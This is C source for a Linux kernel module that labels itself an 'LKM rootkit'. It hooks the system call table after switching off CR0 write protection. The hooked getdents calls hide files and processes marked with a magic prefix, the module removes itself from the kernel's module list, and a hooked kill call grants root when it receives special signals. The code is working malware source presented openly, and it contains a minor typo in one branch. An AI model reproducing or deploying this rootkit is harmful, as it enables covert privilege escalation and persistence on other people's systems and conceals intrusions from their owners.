#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <asm/uaccess.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/path.h>

#include <linux/proc_ns.h>
#include <linux/fdtable.h>


#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#include "hidefiles.h"

unsigned long cr0;
static unsigned long *__sys_call_table;
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents;	
static t_syscall orig_getdents64;
static t_syscall orig_kill;

unsigned long * get_syscall_table_bf(void){
	unsigned long *syscall_table;
#ifdef KPROBE_LOOKUP
	typedef unsigend long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int is_invisible(pid_t pid){
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

struct file *file_open(const char *path, int flags, int rights)
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(KERNEL_DS);

    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp))
    {
    	err = PTR_ERR(filp);
    	return NULL;
    }
    return filp;
}

void file_close(struct file *file)
{
    if(file)
        filp_close(file, NULL);
}

int file_read(struct file *file, unsigned long long offset,
    unsigned char *data, unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(KERNEL_DS);

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_write(struct file *file, unsigned long long offset,
    const unsigned char *data, unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(KERNEL_DS);

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file *file)
{
    vfs_fsync(file, 0);
    return 0;
}

char *read_n_bytes_of_file(struct file *f, int n, int *return_read)
{
    int buf_size = n;
    int res;
    int read = 0;
    char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
    if (buf == NULL)
    	return NULL;

    res = file_read(f, read, buf + read, buf_size - read);
    while (res > 0) {
    	read += res;
    	res = file_read(f, read, buf + read, buf_size - read);
    }
    if (return_read)
    	*return_read = read;
    buf[read] = 0;
    return buf;
}

int is_int(const char *data)
{
    if(data == NULL)
        return 0;
    while(*data)
    {
        if(*data<'0' || *data>'9')
            return 0;
        data++;
    }
    return 1;
}

int check_process_prefix(const char *name)
{
    int err;
    long pid;
    char *path = NULL;
    struct file *f = NULL;
    char *buf = NULL;
    int res = 0;
    int read;
    int i;

    if(!is_int(name))
    	goto end;

    err = kstrtol(name, 10, &pid);
    if (err != 0)
    	goto end;

    path = kzalloc(strlen("/proc/") + strlen(name) 
        + strlen("/cmdline") + 1, GFP_KERNEL);
        
    if (path == NULL)
    	goto end;

    strcpy(path, "/proc/");
    strcat(path, name);
    strcat(path, "/cmdline");

    f = file_open(path, O_RDONLY, 0);
    if (f == NULL)
    	goto end;

    buf = read_n_bytes_of_file(f, CMDLINE_SIZE, &read);

    if(buf == NULL)
    	goto end;

    for (i = 0; i < read; i++)
    {
    	if (buf[i] == 0)
    		buf[i] = ' ';	//cmdline is in format argv[0]\x00argv[1] .... 
    }

    if (strstr(buf, MAGIC_PREFIX))
    {
    	res = 1;
    }

end:
    if (f)
    	file_close(f);
    kfree(buf);
    kfree(path);
    return res;
}


static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs){
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
	int ret = orig_getdents64(pt_regs), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev) /* MINOR(d_inode->i_rdev) == 1 */)
		proc = 1;
	
	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc && is_invisible(simple_strtoul(dir->d_name,NULL,10))) || check_process_prefix(dir->d_name)){
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}


static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
	int ret = orig_getdents(pt_regs), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)) 
		|| (proc && is_invisible(simple_strtoul(dir->d_name,NULL,10))) || check_process_prefix(dir->d_name)){
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

void give_root(void){
	struct cred *newcreds;
	newcreds = prepare_creds();
	if (newcreds == NULL)
		return;
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
		&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
		|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
		newcreds->uid.val = newcreds->gid.val = 0;
		newcreds->euid.val = newcreds->egid.val = 0;
		newcreds->suid.val = newcreds->sgid.val = 0;
		newcreds->fsuid.val = newcreds->fsgid.val = 0;
	#else
		newcreds->uid = newcreds->gid = 0;
		newcreds->euid = newcreds->egid = 0;
		newcreds->suid = newcreds->sgid = 0;
		newcreds->fsuid = newcreds->fsgid = 0;
	#endif
	commit_creds(newcreds);
}

static inline void
tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;
void
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

asmlinkage int hacked_kill(const struct pt_regs *pt_regs){
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;

	struct task_struct *task;
	switch (sig){
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
			return orig_kill(pt_regs);
	}
	return 0;
}


static inline void
write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}


static inline void
protect_memory(void)
{
	write_cr0_forced(cr0);
}

static inline void
unprotect_memory(void)
{
	write_cr0_forced(cr0 & ~0x00010000);
}


static int __init hidefiles_init(void) {
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;

	cr0 = read_cr0();

	module_hide();
	tidy();

	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];

	unprotect_memory();

	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	protect_memory();

	return 0;
}


static void __exit hidefiles_cleanup(void) {
	unprotect_memory();

	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;

	protect_memory();
}

module_init(hidefiles_init);
module_exit(hidefiles_cleanup);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("aaaa");
MODULE_DESCRIPTION("LKM rootkit");

